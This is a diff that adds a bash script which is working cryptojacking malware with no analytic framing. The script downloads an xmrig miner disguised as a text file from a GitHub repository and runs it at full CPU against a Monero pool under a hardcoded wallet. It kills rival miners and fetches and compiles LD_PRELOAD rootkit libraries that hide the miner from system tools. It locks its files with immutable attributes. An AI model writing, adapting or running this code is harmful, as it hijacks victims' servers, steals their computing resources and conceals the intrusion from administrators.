@@ -1,0 +1,82 @@
+#!/bin/bash
+gcc_bin=$(whereis gcc|awk '{print $2}')
+local="/root/.local/.filebet/"
+
+function unset_chattr(){
+chattr -ia /root/.local/.filebet/filebet /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload 2>/dev/null;
+
+rm -f  /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file    2>/dev/null;
+}
+
+function set_chattr(){
+chattr +ia /root/.local/.filebet/filebet /usr/local/lib/genericp.so /usr/local/lib/pingp.so /usr/local/lib/initrdp.so /usr/local/lib/netstatp.so /usr/local/lib/grepp.so /usr/local/lib/sshdp.so /usr/local/lib/zncp.so /usr/local/lib/ncatp.so /usr/local/lib/nmapp.so /usr/local/lib/python3p.so /usr/local/lib/pythonp.so /usr/local/lib/socatp.so /usr/local/lib/filebetp.so /boot/generic /dev/shm/generic /dev/shm/.filebet/filebet /usr/sbin/ping /usr/sbin/file /etc/crontab /var/spool/cron/crontabs/root /etc/network/if-up.d/ping /etc/network/if-up.d/file /etc/ld.so.preload 2>/dev/null;
+}
+
+function hide(){
+if [ $gcc_bin ];then
+printf "compiling hide stuff...\n";
+
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/genericp.c -o genericp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/pingp.c -o pingp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/initrdp.c -o initrdp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/netstatp.c -o netstatp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/grepp.c -o grepp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/sshdp.c -o sshdp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/zncp.c -o zncp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/ncatp.c -o ncatp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/nmapp.c -o nmapp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/python3p.c -o python3p.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/pythonp.c -o pythonp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/socatp.c -o socatp.c
+curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/filebetp.c -o filebetp.c
+
+gcc -Wall -fPIC -shared -o /usr/local/lib/genericp.so genericp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/pingp.so pingp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/initrdp.so initrdp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/netstatp.so netstatp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/grepp.so grepp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/sshdp.so sshdp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/zncp.so zncp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/ncatp.so ncatp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/nmapp.so nmapp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/python3p.so python3p.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/pythonp.so pythonp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/socatp.so socatp.c -ldl 2>/dev/null
+gcc -Wall -fPIC -shared -o /usr/local/lib/filebetp.so filebetp.c -ldl 2>/dev/null
+
+echo '/usr/local/lib/genericp.so' >/etc/ld.so.preload
+echo '/usr/local/lib/pingp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/initrdp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/netstatp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/grepp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/sshdp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/zncp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/ncatp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/nmapp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/python3p.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/pythonp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/socatp.so' >>/etc/ld.so.preload
+echo '/usr/local/lib/filebetp.so' >>/etc/ld.so.preload
+fi
+
+if [[ ! -f /etc/ld.so.preload ]];then
+printf "something went wr0ng when hiding\n"
+exit 1
+fi
+}
+
+unset_chattr
+
+kill -9 `ps -aux|egrep '(miner|xmrig|filebet)'|egrep -v '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null
+rm -rf /root/.local/.filebet/ 2>/dev/null
+mkdir -p /root/.local/.filebet/	
+
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static1.txt"  -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static1.txt -O /root/.local/.filebet/filebet 2>/dev/null; then
+  exit 1
+fi
+
+chmod +x /root/.local/.filebet/filebet
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `hostname` -k --cpu-max-threads-hint=100% -B
+
+hide
+set_chattr
